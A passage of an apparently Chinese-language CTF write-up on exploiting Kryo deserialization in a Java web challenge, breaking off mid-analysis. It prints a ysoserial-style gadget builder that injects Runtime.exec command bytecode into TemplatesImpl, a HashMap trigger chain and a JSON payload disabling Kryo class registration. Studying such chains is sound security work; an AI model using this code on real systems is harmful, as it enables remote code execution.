handlers ) throws TransletException {}
        @Override
        public void transform (DOM document, DTMAxisIterator iterator, 
SerializationHandler handler ) throws TransletException {}
    }
    // required to make TemplatesImpl happy
    public static class Foo implements Serializable {
        private static final long serialVersionUID = 8207363842866235160L;
    }
    public static InvocationHandler createMemoizedInvocationHandler (final 
Map map ) throws Exception {
        return (InvocationHandler) 
Utils.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, 
map);
    }
    public static Object createTemplatesImpl ( final String command ) 
throws Exception {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", 
"false")) ) {
            return createTemplatesImpl(
                    command,
 Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
 Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
 Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }
        return createTemplatesImpl(command, TemplatesImpl.class, 
AbstractTranslet.class, TransformerFactoryImpl.class);
    }
    public static  T createTemplatesImpl ( final String command, 
Class tplClass, Class abstTranslet, Class transFactory )
            throws Exception {
        final T templates = tplClass.newInstance();
        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new 
ClassClassPath(Utils.StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        final CtClass clazz = 
pool.get(Utils.StubTransletPayload.class.getName());
        // run command in static initializer
        // TODO: could also do fun things like injecting a pure-java 
rev/bind-shell to bypass naive protections
        String cmd = "System.out.println(\"whoops!\"); 
java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", 
"\\\"") +
                "\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        // sortarandom name to allow repeated exploitation (watch out for 
PermGen exhaustion)
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);
        final byte[] classBytes = clazz.toBytecode();
        // inject class bytes into instance
        Utils.setFieldValue(templates, "_bytecodes", new byte[][] {
                classBytes, Utils.classAsBytes(Utils.Foo.class)
        });
        // required to make TemplatesImpl happy
        Utils.setFieldValue(templates, "_name", "Pwnr");
        Utils.setFieldValue(templates, "_tfactory", 
transFactory.newInstance());
        return templates;
    }
    public static Field getField(final Class clazz, final String 
fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
    public static void setFieldValue(final Object obj, final String 
fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
    public static Object getFieldValue(final Object obj, final String 
fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }
    public static Constructor getFirstCtor(final String name) throws 
Exception {
        final Constructor ctor = 
Class.forName(name).getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        return ctor;
    }
    @SuppressWarnings ( {"unchecked"} )
    public static  T createWithConstructor ( Class 
classToInstantiate, Class constructorClass, Class[] 
consArgTypes, Object[] consArgs )
            throws NoSuchMethodException, InstantiationException, 
IllegalAccessException, InvocationTargetException {
        Constructor objCons = 
constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        Constructor sc = 
ReflectionFactory.getReflectionFactory().newConstructorForSerialization(cl
assToInstantiate, objCons);
        sc.setAccessible(true);
        return (T)sc.newInstance(consArgs);
    }
    public static String classAsFile(final Class clazz) {
        return classAsFile(clazz, true);
    }
    public static String classAsFile(final Class clazz, boolean suffix) 
{
        String str;
        if (clazz.getEnclosingClass() == null) {
            str = clazz.getName().replace(".", "/");
        } else {
            str = classAsFile(clazz.getEnclosingClass(), false) + "$" + 
clazz.getSimpleName();
        }
        if (suffix) {
            str += ".class";
        }
        return str;
    }
    public static byte[] classAsBytes(final Class clazz) {
        try {
            final byte[] buffer = new byte[1024];
            final String file = classAsFile(clazz);
            final InputStream in = 
Utils.class.getClassLoader().getResourceAsStream(file);
            if (in == null) {
                throw new IOException("couldn't find '" + file + "'");
            }
            final ByteArrayOutputStream out = new ByteArrayOutputStream();
            int len;
            while ((len = in.read(buffer)) != -1) {
                out.write(buffer, 0, len);
            }
            return out.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
但是当你兴冲冲的写好利⽤链以后，会发现⼏个问题
⾸先你会看到⼀⾏报错, Class is not registered: java.util.HashMap
那么你肯定会疑惑这是什么玩意⼉？它来⾃哪⾥？
    public static HashMap makeMap (Object v1, Object v2 ) 
throws Exception {
        HashMap s = new HashMap<>();
        Utils.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, 
Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);
        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Utils.setFieldValue(s, "table", tbl);
        return s;
    }
    public static Object makeXStringToStringTrigger(Object o,Object bean) 
throws Exception {
        return Utils.makeMap(new HotSwappableTargetSource(o), new 
HotSwappableTargetSource(bean));
    }
}
我们可以看到
在 com.esotericsoftware.kryo.Kryo#Kryo(com.esotericsoftware.kryo.ClassRes
olver, com.esotericsoftware.kryo.ReferenceResolver)
⾸先实例化的时候注册了⼀些基本类型
然后在代码当中有 this.kryo.register(Mocha.class);
可以看到默认是 FieldSerializer
那我们也知道我们这个思路触发的核⼼是通过
com.esotericsoftware.kryo.serializers.MapSerializer ，但是这⾥我们没法⾃⼰
注册怎么办呢，还记得上⾯那个路由么，demo路由当中可以根据我们前端传⼊的json当中的
熟悉控制执⾏对应的set⽅法做属性更改，这⾥我不直接说需要更改哪些属性去解决这道题，
个⼈更倾向于遇到⼀个问题解决⼀个问题
那么既然能控制属性，我们也得知道能控制那⼀些，通过简单输出可以得到
setWarnUnregisteredClasses
setDefaultSerializer
setDefaultSerializer
setClassLoader
setRegistrationRequired
setReferences
setCopyReferences
setReferenceResolver
setInstantiatorStrategy
setAutoReset
setMaxDepth
setOptimizedGenerics
回到刚刚的问题
既然如此那么我们⾸先需要知道在哪⾥抛出了这个异常，可以看到在
com.esotericsoftware.kryo.Kryo#getRegistration(java.lang.Class)
简单列出现在的调⽤栈，是在序列化的过程当中
可以看到根据类型在this.classResolver.getRegistration⽆结果就会抛出异常，通过debug输出
classResolver当中的关键信息，可以很明显得到基本都是⼀些基本的数据类型,没有我们的Map
getRegistration:579, Kryo (com.esotericsoftware.kryo)
writeClass:112, DefaultClassResolver (com.esotericsoftware.kryo.util)
writeClass:613, Kryo (com.esotericsoftware.kryo)
writeClassAndObject:708, Kryo (com.esotericsoftware.kryo)
ser:97, Testt (demo)
main:121, Testt (demo)
我们再来看在抛出异常的那部分，如果将registrationRequired设置为false，则可以略过这些过
程
此时它会执
⾏ com.esotericsoftware.kryo.util.DefaultClassResolver#registerImplicit
{
char=[5, char], 
long=[7, long], 
class java.lang.Byte=[4, byte], 
class java.lang.Character=[5, char], 
double=[8, double], 
class java.lang.Short=[6, short], 
int=[0, int], 
class java.lang.Integer=[0, int], 
byte=[4, byte], 
float=[2, float], 
class java.lang.Double=[8, double], 
class java.lang.Boolean=[3, boolean], 
boolean=[3, boolean], 
short=[6, short], 
class java.lang.Long=[7, long], 
class java.lang.String=[1, String], 
class java.lang.Float=[2, float]
}
=> com.esotericsoftware.kryo.Kryo#getDefaultSerializer 最终获取到我们需要的
com.esotericsoftware.kryo.serializers.MapSerializer
通过⽐对属性以及上⾯提到的可利⽤的set⽅法，我们能很容易通过payload的传⼊控制这个过
程
ok当你感觉又⾏的时候，又兴致冲冲运⾏了代码，此时又出现 Class cannot be created 
(missing no-arg constructor): ，字⾯意思是我们序列化的类需要有⽆参构造函数
那我们再跟进代码看看实例化报错到底是怎么回事，在实例化⼀个类的时候会通过调
⽤ com.esotericsoftware.kryo.Kryo#newInstantiator ，
并最终会调⽤
到 com.esotericsoftware.kryo.util.DefaultInstantiatorStrategy#newInstanti
atorOf
此时的调⽤栈为
{"RegistrationRequired":false}
newInstantiatorOf:96, DefaultInstantiatorStrategy 
(com.esotericsoftware.kryo.util)